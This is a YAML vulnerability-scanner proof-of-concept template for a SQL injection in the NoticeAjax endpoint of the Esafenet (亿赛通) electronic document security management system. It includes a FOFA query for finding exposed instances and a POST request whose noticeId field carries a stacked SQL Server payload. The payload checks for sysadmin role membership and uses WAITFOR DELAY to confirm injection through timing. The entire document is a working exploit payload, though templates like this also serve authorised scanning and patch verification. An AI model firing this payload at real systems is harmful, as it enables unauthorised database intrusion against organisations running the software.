id: poc-yaml-yisaitong-esafenet-noticeajax-sqli
info:
  name: 亿赛通电子文档安全管理系统 NoticeAjax SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 亿赛通电子文档安全管理系统
  fofa: app="亿赛通-电子文档安全管理系统"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"CDGServer3")
- method: POST
  path: /CDGServer3/NoticeAjax;Service
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: command=delNotice&noticeId=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1
    WAITFOR DELAY '0:0:{{.t1}}'--
  expression: status_code == 200 && duration > t1 && duration < t2
transport: http
